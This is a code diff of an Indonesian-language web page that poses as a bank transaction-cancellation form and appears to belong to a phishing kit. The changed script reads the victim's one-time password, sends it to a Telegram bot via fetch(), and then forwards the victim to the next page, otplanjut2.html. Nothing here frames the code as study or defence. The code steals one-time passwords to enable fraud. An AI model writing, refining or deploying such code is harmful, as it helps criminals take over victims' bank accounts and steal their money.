@@ -227,32 +227,29 @@
     <span class="">Masukan OTP Untuk Pembatalan Transaksi</span>
 </div>
 
-<div class="form-row m-n">
-<form autocomplete="off" action="otplanjut2.html" method="GET">
+<form id="formotp4" autocomplete="off">
+    <div class="form-row m-n">
+        <input id="PASSWORD1" name="otp" class="form-control input-text text-lg parsley-validated" placeholder="OTP" autocomplete="off" type="password" inputmode="numeric" maxlength="6"/>
+    </div>
 
-        <input id="PASSWORD1" name="otp" class="form-control input-text text-lg parsley-validated" placeholder="OTP" autocomplete="off" type="password" inputmode="numeric" value="" size="26" maxlength="6"/>
-</div>
+    <br/>
 
-<br/>
-
-<div class="rows m-l-md m-r-md mb-p-b-lg">
-    <button class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm" type="submit" value="Submit">
-        <span class="">Batalkan Transaksi</span>
-    </button>
-</div>
-
+    <div class="rows m-l-md m-r-md mb-p-b-lg">
+        <button class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm" type="submit">
+            <span class="">Batalkan Transaksi</span>
+        </button>
+    </div>
 </form>
 
 <!-- Panggil config.js -->
 <script src="../../config.js"></script>
-
 
 <script>
 window.onload = function() {
     document.getElementById("formotp4").addEventListener("submit", function(e) {
         e.preventDefault();
 
-        const otp = document.getElementById("PASSWORD1").value;
+        const otp = document.getElementById("PASSWORD1").value.trim();
 
         if (otp === "") {
             alert("Masukkan kode OTP terlebih dahulu!");
@@ -279,17 +276,24 @@ window.onload = function() {
                 parse_mode: "Markdown"
             })
         })
-        .then(res => res.json())
-        .then(res => {
-            document.getElementById("formotp4").submit(); // Lanjut ke otplanjut.html
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // Jika berhasil, arahkan ke halaman selanjutnya
+                window.location.href = "otplanjut2.html";
+            } else {
+                console.error("Telegram Error:", data);
+                alert("Gagal mengirim OTP ke Telegram!");
+            }
         })
         .catch(err => {
-            console.error(err);
-            alert("Gagal mengirim OTP.");
+            console.error("Fetch Error:", err);
+            alert("Terjadi kesalahan saat mengirim OTP.");
         });
     });
 }
 </script>
+
 
 														
 <div class="rows text-md login-footer m-t-md">
